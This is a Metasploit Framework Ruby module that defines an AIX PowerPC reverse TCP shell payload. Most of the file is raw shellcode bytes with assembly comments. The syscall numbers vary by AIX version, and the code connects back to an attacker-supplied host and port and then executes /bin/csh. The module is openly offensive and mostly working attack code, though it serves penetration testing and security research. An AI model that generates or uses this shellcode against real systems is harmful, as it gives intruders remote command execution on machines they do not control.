##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Aix
module Power

module ShellReverseTcp

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'AIX Command Shell, Reverse TCP Inline',
			'Version'       => '$Revision$',
			'Description'   => 'Connect back to attacker and spawn a command shell',
			'Author'        => 'Ramon de Carvalho Valle <ramon[at]risesecurity.org>',
			'License'       => MSF_LICENSE,
			'Platform'      => 'aix',
			'Arch'          => ARCH_POWER,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'LHOST'    => [ 32, 'ADDR' ],
							'LPORT'    => [ 30, 'n'    ],
						},
				}
		))

    register_options(
      [
        OptString.new('AIX_VERSION', [ true, "AIX Version", "5.3" ]),
      ], Msf::Payloads::Singles::Aix::Power::ShellBindTcp)
	end

  def generate
    case datastore['AIX_VERSION']
      when '4.1'
        cal_socket  = "\x38\x5d\xfe\x58"      #   cal     r2,-424(r29)               #
        cal_connect = "\x38\x5d\xfe\x59"      #   cal     r2,-423(r29)               #
        cal_close   = "\x38\x5d\xfe\x5f"      #   cal     r2,-417(r29)               #
        cal_kfcntl  = "\x38\x5d\xfe\xd7"      #   cal     r2,-297(r29)               #
        cal_execve  = "\x38\x5d\xfe\x04"      #   cal     r2,-508(r29)               #
      when '4.2'
        cal_socket  = "\x38\x5d\xfe\x5c"      #   cal     r2,-420(r29)               #
        cal_connect = "\x38\x5d\xfe\x5d"      #   cal     r2,-419(r29)               #
        cal_close   = "\x38\x5d\xfe\x63"      #   cal     r2,-413(r29)               #
        cal_kfcntl  = "\x38\x5d\xfe\xe8"      #   cal     r2,-280(r29)               #
        cal_execve  = "\x38\x5d\xfe\x03"      #   cal     r2,-509(r29)               #
      when '4.3'
        cal_socket  = "\x38\x5d\xfe\x6a"      #   cal     r2,-406(r29)               #
        cal_connect = "\x38\x5d\xfe\x6b"      #   cal     r2,-405(r29)               #
        cal_close   = "\x38\x5d\xfe\x72"      #   cal     r2,-398(r29)               #
        cal_kfcntl  = "\x38\x5d\xfe\xfd"      #   cal     r2,-259(r29)               #
        cal_execve  = "\x38\x5d\xfe\x05"      #   cal     r2,-507(r29)               #
      when '4.3.3.0'
        cal_socket  = "\x38\x5d\xfe\x79"      #   cal     r2,-391(r29)               #
        cal_connect = "\x38\x5d\xfe\x7a"      #   cal     r2,-390(r29)               #
        cal_close   = "\x38\x5d\xfe\x83"      #   cal     r2,-381(r29)               #
        cal_kfcntl  = "\x38\x5d\xff\x10"      #   cal     r2,-240(r29)               #
        cal_execve  = "\x38\x5d\xfe\x04"      #   cal     r2,-508(r29)               #
      when '5.3'
        cal_socket  = "\x38\x5d\xfe\x8e"      #   cal     r2,-370(r29)               #
        cal_connect = "\x38\x5d\xfe\x8f"      #   cal     r2,-369(r29)               #
        cal_close   = "\x38\x5d\xfe\xa1"      #   cal     r2,-351(r29)               #
        cal_kfcntl  = "\x38\x5d\xff\x43"      #   cal     r2,-189(r29)               #
        cal_execve  = "\x38\x5d\xfe\x06"      #   cal     r2,-506(r29)               #
    end

    payload =
            "\x7c\xa5\x2a\x79"     +#   xor.    r5,r5,r5                   #
            "\x40\x82\xff\xfd"     +#   bnel    <cntsockcode>              #
            "\x7f\xc8\x02\xa6"     +#   mflr    r30                        #
            "\x3b\xde\x01\xff"     +#   cal     r30,511(r30)               #
            "\x3b\xde\xfe\x25"     +#   cal     r30,-475(r30)              #
            "\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
            "\x4e\x80\x04\x20"     +#   bctr                               #
            "\xff\x02\x04\xd2"     +#   .long   0xff0204d2                 #
            "\x7f\x00\x00\x01"     +#   .long   0x7f000001                 #
            "\x4c\xc6\x33\x42"     +#   crorc   6,6,6                      #
            "\x44\xff\xff\x02"     +#   svca    0                          #
            "\x3b\xde\xff\xf8"     +#   cal     r30,-8(r30)                #
            "\x3b\xa0\x01\xff"     +#   lil     r29,511                    #
            "\x38\x9d\xfe\x02"     +#   cal     r4,-510(r29)               #
            "\x38\x7d\xfe\x03"     +#   cal     r3,-509(r29)               #
            cal_socket +
            "\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
            "\x4e\x80\x04\x21"     +#   bctrl                              #
            "\x7c\x7c\x1b\x78"     +#   mr      r28,r3                     #
            "\x38\xbd\xfe\x11"     +#   cal     r5,-495(r29)               #
            "\x38\x9e\xff\xf8"     +#   cal     r4,-8(r30)                 #
            cal_connect +
            "\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
            "\x4e\x80\x04\x21"     +#   bctrl                              #
            "\x3b\x7d\xfe\x03"     +#   cal     r27,-509(r29)              #
            "\x7f\x63\xdb\x78"     +#   mr      r3,r27                     #
            cal_close +
            "\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
            "\x4e\x80\x04\x21"     +#   bctrl                              #
            "\x7f\x65\xdb\x78"     +#   mr      r5,r27                     #
            "\x7c\x84\x22\x78"     +#   xor     r4,r4,r4                   #
            "\x7f\x83\xe3\x78"     +#   mr      r3,r28                     #
            cal_kfcntl +
            "\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
            "\x4e\x80\x04\x21"     +#   bctrl                              #
            "\x37\x7b\xff\xff"     +#   ai.     r27,r27,-1                 #
            "\x40\x80\xff\xd4"     +#   bge     <cntsockcode+100>          #
            "\x7c\xa5\x2a\x79"     +#   xor.    r5,r5,r5                   #
            "\x40\x82\xff\xfd"     +#   bnel    <cntsockcode+148>          #
            "\x7f\x48\x02\xa6"     +#   mflr    r26                        #
            "\x3b\x5a\x01\xff"     +#   cal     r26,511(r26)               #
            "\x38\x7a\xfe\x25"     +#   cal     r3,-475(r26)               #
            "\x94\xa1\xff\xfc"     +#   stu     r5,-4(r1)                  #
            "\x94\x61\xff\xfc"     +#   stu     r3,-4(r1)                  #
            "\x7c\x24\x0b\x78"     +#   mr      r4,r1                      #
            cal_execve +
            "\x7f\xc9\x03\xa6"     +#   mtctr   r30                        #
            "\x4e\x80\x04\x20"     +#   bctr                               #
            "/bin/csh"
    
  end

end

end end end end end
